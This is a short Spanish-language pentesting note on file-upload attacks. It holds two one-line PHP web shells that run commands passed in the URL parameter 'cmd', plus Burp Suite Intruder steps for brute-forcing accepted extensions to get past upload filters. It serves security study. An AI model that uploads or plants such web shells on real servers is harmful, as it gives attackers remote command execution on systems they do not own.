---------
- Tags: #owasp #web  #vuln 
----------

- *PHP File*
```PHP
<?php
    system($_GET['cmd']);
?>
```

- *PHP preformateado*
```PHP
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

 ----------------

## Ataque Intruder a extensiones con [[BurpSuite]]:

- Intereceptamos la subida del archivo con el proxy
- Mandamos la peticion al intruder y como [[Payloads]] ponemos el campo de la extension
- Una vez en el intruder le damos en la ventana *payloads*, en simple list agregamos todas las extensiones a probar, por ejemplo: *phar*, 
_.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_,  ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
ETC

-  Ahora podriamos en la ventana *options* settear una *REGEX* que nos muestre una columna extra para ver respuesta de la peticion
- Le damos ahora a *add*, *Fetch Response* y aqui podriamos seleccionar la respuesta de la peticion que va a diferenciar segun sea valida o no, por ejemplo la cadena *Error, Fail to upload*
- Una vez Setteado todo, podemos inicar el ataque, y se veria algo asi:

![[Pasted image 20230802010206.png]]


- [HackTricks: ](https://book.hacktricks.xyz/pentesting-web/file-upload)
